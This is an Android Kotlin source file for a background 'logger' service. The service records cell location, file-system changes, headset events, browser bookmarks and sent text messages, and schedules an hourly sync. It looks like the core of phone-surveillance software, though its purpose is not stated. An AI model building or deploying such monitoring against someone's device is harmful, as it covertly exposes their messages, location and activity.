package org.magnum.logger

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import org.magnum.logger.communication.messaging.SentMessageHandler
import org.magnum.logger.connectivity.devices.HeadsetHandler
import org.magnum.logger.connectivity.mobile.MobileHandler
import org.magnum.logger.user.browsing.BrowserHandler
import org.magnum.logger.user.files.FileHandler
import java.util.*

class Controller : Service() {
    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        try {
            monitorMobileCells()
            monitorFiles()
            monitorHeadset()
            monitorBrowsing()
            monitorOutgoingMessages()
            scheduleSync()
        } catch (e: Exception) {
            Log.e(TAG, e.toString())
        }
        return START_STICKY
    }

    private fun monitorMobileCells() {
        val manager = applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        manager.listen(MobileHandler(applicationContext), PhoneStateListener.LISTEN_CELL_LOCATION)
    }

    private fun monitorHeadset() {
        registerReceiver(HeadsetHandler(), IntentFilter(Intent.ACTION_HEADSET_PLUG))
    }

    private fun monitorBrowsing() {
        // Chrome
        applicationContext.contentResolver.registerContentObserver(Uri.parse("content://com.android.chrome.browser/bookmarks"), true, BrowserHandler(applicationContext, Handler()))
        // Any other browser
//        applicationContext.contentResolver.registerContentObserver(Browser.BOOKMARKS_URI, true, BrowserHandler(applicationContext, Handler()))
    }

    private fun monitorFiles() {
        fileList.add(FileHandler(applicationContext, Environment.getRootDirectory().absolutePath))
        fileList.add(FileHandler(applicationContext, Environment.getDataDirectory().absolutePath))
        fileList.add(FileHandler(applicationContext, Environment.getDownloadCacheDirectory().absolutePath))
        fileList.add(FileHandler(applicationContext, Environment.getExternalStorageDirectory().absolutePath))
        for (directory in DIRECTORIES) {
            fileList.add(FileHandler(applicationContext, Environment.getExternalStoragePublicDirectory(directory).absolutePath))
        }
        for (handler in fileList) {
            handler.startWatching()
        }
    }

    private fun monitorOutgoingMessages() {
        // Up to ICS
        applicationContext.contentResolver.registerContentObserver(Uri.parse("content://sms/sent"), true, SentMessageHandler(applicationContext, Handler()))
        // Jelly Beans
        // TODO: Handle repeated calls
        applicationContext.contentResolver.registerContentObserver(Uri.parse("content://mms-sms/conversations_messages?simple=false"), true, SentMessageHandler(applicationContext, Handler()))
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    private fun scheduleSync() {
        val pendingIntent = PendingIntent.getService(applicationContext, 0, Intent(this, SyncService::class.java), 0)
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), AlarmManager.INTERVAL_HOUR, pendingIntent)
    }

    companion object {
        private val TAG = Controller::class.java.canonicalName
        private val DIRECTORIES = arrayOf(Environment.DIRECTORY_ALARMS, Environment.DIRECTORY_DCIM, Environment.DIRECTORY_DOWNLOADS, Environment.DIRECTORY_MOVIES, Environment.DIRECTORY_MUSIC, Environment.DIRECTORY_NOTIFICATIONS,
                Environment.DIRECTORY_PICTURES, Environment.DIRECTORY_PODCASTS, Environment.DIRECTORY_RINGTONES)
        var fileList: MutableList<FileHandler> = ArrayList()
    }
}